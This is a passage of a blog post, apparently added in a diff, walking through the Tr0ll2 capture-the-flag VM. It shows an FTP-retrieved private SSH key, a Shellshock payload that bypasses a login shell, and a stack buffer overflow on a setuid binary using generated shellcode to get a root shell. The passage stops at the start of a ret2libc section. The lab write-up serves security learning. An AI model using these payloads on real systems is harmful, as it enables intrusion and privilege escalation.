+</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
+</span><span class='line'>226 Directory send OK.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just one file, <code>lmao.zip</code>, let&rsquo;s get it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; get lmao.zip
+</span><span class='line'>local: lmao.zip remote: lmao.zip
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+</span><span class='line'>226 Transfer complete.
+</span><span class='line'>1474 bytes received in 0.00 secs (2460.6 kB/s)
+</span><span class='line'>ftp&gt; quit
+</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And unzip:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# unzip lmao.zip 
+</span><span class='line'>Archive:  lmao.zip
+</span><span class='line'>[lmao.zip] noob password: </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Password protected?! Ahhhhh&hellip; luckily, I had a good gut feel and got it at the first try - remember the string <code>ItCantReallyBeThisEasyRightLOL</code>? It did kinda look like password&hellip; well, it is! :)</p>
+
+<p>As a result, we get a <code>noob</code> file, which is an RSA private key!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat noob 
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+</span><span class='line'>zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Breaking into shell? Shock(ing)!</h2>
+
+<p>Sweet, let&rsquo;s use it to log-in via <code>ssh</code>. But what username should we use? Let&rsquo;s try <code>noob</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob 
+</span><span class='line'>TRY HARDER LOL!
+</span><span class='line'>Connection to 172.16.246.135 closed.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What the hell?! The connection is closed straight away. Okay, I know few workarounds for it&hellip; Let&rsquo;s try calling different shell at the log-in:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "/bin/sh"
+</span><span class='line'>TRY HARDER LOL!
+</span><span class='line'>Connection to 172.16.246.135 closed.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nope. How about starting shell without the &lsquo;rc&rsquo; profile:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "bash --noprofile"
+</span><span class='line'>TRY HARDER LOL!
+</span><span class='line'>Connection to 172.16.246.135 closed.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Arrrghhh! It&rsquo;s getting annoying. What&rsquo;s other way I can bypass that&hellip;? And then it hit me - how could I forget about it (it kept me up at night for much longer than I would&rsquo;ve like), ladies and gentleman - SHELLSHOCK!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "() { :; }; /bin/bash"
+</span><span class='line'>noob@Tr0ll2:~$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sweeeeeeeet, we&rsquo;re in! :D</p>
+
+<h2>Exploiting buffer overflow</h2>
+
+<p>After a bit of a poking around we can quickly find an interesting folder with even more interesting files:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely/
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
+</span><span class='line'>door1  door2  door3
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
+</span><span class='line'>door1:
+</span><span class='line'>total 16
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  4 22:19 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7271 Oct  4 22:19 r00t
+</span><span class='line'>
+</span><span class='line'>door2:
+</span><span class='line'>total 20
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5 21:19 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 8401 Oct  5 21:17 r00t
+</span><span class='line'>
+</span><span class='line'>door3:
+</span><span class='line'>total 16
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5 21:18 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7273 Oct  5 21:18 r00t</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Three binaries owned by root with a &lsquo;sticky bit&rsquo; set! Seems like we should be able to get our privilege escalation through it.</p>
+
+<p>But that&rsquo;s where the trolls hit again, only one of these binaries is actually useful, other two are just trolling with you - one of them reboots the VM and the other puts you in a restricted shell for a limited period of time. The one of interest that we&rsquo;ll be exploiting is the biggest one. Also, it seems that periodically the binaries are shuffled around the directories (once it&rsquo;s <code>door1</code>, then maybe <code>door3</code> etc.), so make sure to always keep an eye on the size of the binary you&rsquo;re working on.</p>
+
+<p>Alright, let&rsquo;s get to the fun part! First, let&rsquo;s run the right binary and see what it does.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t 
+</span><span class='line'>Usage: ./r00t input
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t AAAAAAAAAAAAAA
+</span><span class='line'>AAAAAAAAAAAAAA</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OK, it seems like it&rsquo;s just replaying the input. Let&rsquo;s pass in something big.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 400')
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hahaaa! Hello seg-fault, I was expecting you. Let&rsquo;s find out can we overwrite return address and what&rsquo;s the offset.</p>
+
+<p>As always, best tool for the job - <code>pattern_create.rb</code> in metasploit tools.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 400
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Conveniently <code>gdb</code> is installed on the host, so we can do our debugging in there. Let&rsquo;s find the offset!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x6a413969 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 6a413969
+</span><span class='line'>[*] Exact match at offset 268
+</span><span class='line'>root@kali:/usr/share/metasploit-framework/tools# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool! So we need to overwrite 268 bytes to get to the EIP. Let&rsquo;s see what protections are enabled using another useful tool <code>checksec.sh</code>, copy it onto the host and see what it&rsquo;ll tell us about our binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/checksec.sh --file r00t 
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome! Pretty much everything disabled - that should be easy :) And since we&rsquo;re on 32 bit machine, just a quick precautionary increase of the stack size to &lsquo;disable&rsquo; ASLR to prevent messing with our addresses.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ uname -a
+</span><span class='line'>Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ulimit -s unlimited</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;re good to go! There are couple methods how we can exploit it and I&rsquo;ll describe two that came to my mind straight away - putting a shellcode in an environment variable and ret2libc. Let&rsquo;s do it!</p>
+
+<h2>Buffer overflow with payload in an environment variable</h2>
+
+<p>Since NX is disabled, we can execute code from anywhere, including .data section. That makes it pretty simple, we can put the shellcode we want to run in an environment variable and overwrite EIP with address of the shellcode.</p>
+
+<p>First, let&rsquo;s create a shellcode with Metasploit.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use payload/linux/x86/exec 
+</span><span class='line'>msf payload(exec) &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options (payload/linux/x86/exec):
+</span><span class='line'>
+</span><span class='line'>   Name  Current Setting  Required  Description
+</span><span class='line'>   ----  ---------------  --------  -----------
+</span><span class='line'>   CMD                    yes       The command string to execute
+</span><span class='line'>
+</span><span class='line'>msf payload(exec) &gt; set CMD /bin/sh
+</span><span class='line'>CMD =&gt; /bin/sh
+</span><span class='line'>msf payload(exec) &gt; generate -b '\x00' -s 50
+</span><span class='line'># linux/x86/exec - 120 bytes
+</span><span class='line'># http://www.metasploit.com
+</span><span class='line'># Encoder: x86/shikata_ga_nai
+</span><span class='line'># NOP gen: x86/opty2
+</span><span class='line'># VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+</span><span class='line'># PrependSetreuid=false, PrependSetuid=false, 
+</span><span class='line'># PrependSetresgid=false, PrependSetregid=false, 
+</span><span class='line'># PrependSetgid=false, PrependChrootBreak=false, 
+</span><span class='line'># AppendExit=false, CMD=/bin/sh
+</span><span class='line'>buf = 
+</span><span class='line'>"\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8" +
+</span><span class='line'>"\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b" +
+</span><span class='line'>"\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14" +
+</span><span class='line'>"\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd" +
+</span><span class='line'>"\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03" +
+</span><span class='line'>"\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59" +
+</span><span class='line'>"\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1" +
+</span><span class='line'>"\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1" +
+</span><span class='line'>"\x48\x75\x66\x56\x01\x94\x45\xd8"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Calling <code>generate</code> with <code>-b '\x00'</code> to avoid NULL bytes that could mess up our exploit and <code>-s 50</code> to include 50 byte NOP sled. This will help us locating the shellcode in the memory as we won&rsquo;t need to provide exact address where the shellcode starts, but just a rough vicinity (we can land anywhere on NOPs).</p>
+
+<p>Let&rsquo;s put the shellcode in the environment.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=$(python -c 'print "\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1\x48\x75\x66\x56\x01\x94\x45\xd8"')</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And it&rsquo;s in! Now all we need to do, is find its address and overwrite EIP with it. To do it, let&rsquo;s reach to yet another tool in my arsenal - simple C code to locate environment variables.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;EGG address 0x%lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">));</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Copy it across, compile and run to find the address of our EGG (shellcode).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
+</span><span class='line'>EGG address 0xbffffe57</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alright, so we have the address of the EGG, let&rsquo;s try to exploit it! Again, we need to overwrite 268 bytes to get to EIP and then pass in address of our shellcode.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x57\xfe\xff\xbf"')
+</span><span class='line'>Segmentation fault
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x67\xfe\xff\xbf"')
+</span><span class='line'># whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Voila! :) Needed to adjust address of shellcode a little bit, but thanks to NOP sled we got it on a second try - that was pretty simple. Let&rsquo;s now have a look at ret2libc option (my personal favourite).</p>
+
+<h2>Ret2libc</h2>
+
+<p>So, with ret2libc things are a little bit different. If NX was enabled, it would mean we can only execute code from executable sectors of the program and the approach described above wouldn&rsquo;t work.</p>
+
+<p>In order to bypass this, we can utilise functions in the C libraries that are generally loaded by majority of the programs. One particular function we would want to use is <code>system()</code> that invokes system commands passed in. Because it takes a parameter, we need to create a fake stack frame to make it look like it&rsquo;s really a function being called.</p>
+
+<p>Essentially, we want to make the stack look as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.
+</span><span class='line'>                -- Current --                    -- Target --
+</span><span class='line'>     0000
+</span><span class='line'>             ------------------               ------------------
+</span><span class='line'>             |                |               |                |
+</span><span class='line'>             |                |               | AAAAAAAAAAAAAA |
+</span><span class='line'>       ^     |     Buffer     |               | AAAAAAAAAAAAAA |   
+</span><span class='line'>       |     |                |   268 bytes   | AAAAAAAAAAAAAA |  Overflow buffer with dummy data
+</span><span class='line'>     stack   |                |               | AAAAAAAAAAAAAA |
+</span><span class='line'>     growth  ------------------               | AAAAAAAAAAA... |
+</span><span class='line'>       |     |  Base pointer  |               |                |  
+</span><span class='line'>       |     ------------------               ------------------
+</span><span class='line'>             | Return address |    4 bytes    |    system()    |   system() call
+</span><span class='line'>             ------------------               ------------------
+</span><span class='line'>             |                |    4 bytes    |      BBBB      |   dummy return from system()
+</span><span class='line'>             |  Rest of the   |               ------------------
+</span><span class='line'>             |     stack      |    4 bytes    | /bin/sh (&EGG) |   address of the EGG environment variable
+</span><span class='line'>             |                |               ------------------   containing string argument passed to system()
+</span><span class='line'>             |      ...       |               |       ...      |
+</span><span class='line'>     FFFF</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First, let&rsquo;s get the address of <code>system</code> using <code>gdb</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
